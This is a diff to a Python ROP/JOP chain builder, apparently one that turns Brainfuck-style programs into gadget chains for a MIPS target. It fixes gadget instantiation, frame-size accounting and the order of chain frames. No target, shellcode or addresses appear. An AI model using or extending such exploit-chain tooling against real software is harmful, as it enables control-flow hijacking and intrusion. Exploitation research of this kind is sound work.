@@ -46,7 +46,7 @@ class BF_Parser():
         self.__mov_a4_a3  = MOVA4_A3()
         self.__mov_a0_a4  = MOVA0_A4()
         self.__beqz_a0    = Beqz_a0()
-        self.__add_a0_s0  = Add_A0_S0
+        self.__add_a0_s0  = Add_A0_S0()
 
         # jop gadget objects
         self.__init_a3    = InitializeA3()
@@ -88,7 +88,7 @@ class BF_Parser():
                    self.__copy_a3.get_frame_size() + \
                    self.__mov_a4_a3.get_frame_size() + \
                    self.__mov_a0_a4.get_frame_size() + \
-                   self.__charger.get_frame_size() + \
+                   2 * self.__charger.get_frame_size() + \
                    self.__mov_a0_s0.get_frame_size() + \
                    self.__beqz_a0.get_frame_size() + \
                    self.__add_a0_s0.get_frame_size()
@@ -270,15 +270,17 @@ class BF_Parser():
                                                     s4=self.__mov_a0_s0.get_vaddr()
                                                     )
 
-        rop_chain += self.__mov_a0_s0.construct_frame(ra=self.__beqz_a0.get_vaddr(), \
-                                                      s0=nonzero_sp - zero_sp, \
-                                                      s2=1, \
-                                                      s3=1, \
-                                                      s7=self.__move_sp.get_vaddr() \
-                                                      )
+        rop_chain += self.__mov_a0_s0.construct_frame(ra=self.__charger.get_vaddr())
+
+        rop_chain += self.__charger.construct_frame(ra=self.__beqz_a0.get_vaddr(), \
+                                                    s0=nonzero_sp - zero_sp, \
+                                                    s2=1, \
+                                                    s3=1, \
+                                                    s7=self.__move_sp.get_vaddr() \
+                                                    )
 
         rop_chain += self.__beqz_a0.construct_frame(ra=self.__add_a0_s0.get_vaddr(), \
-                                                    s0=zero_sp \
+                                                    a0=zero_sp \
                                                     )
 
         rop_chain += self.__add_a0_s0.construct_frame(ra=self.__mov_s0_a0.get_vaddr())
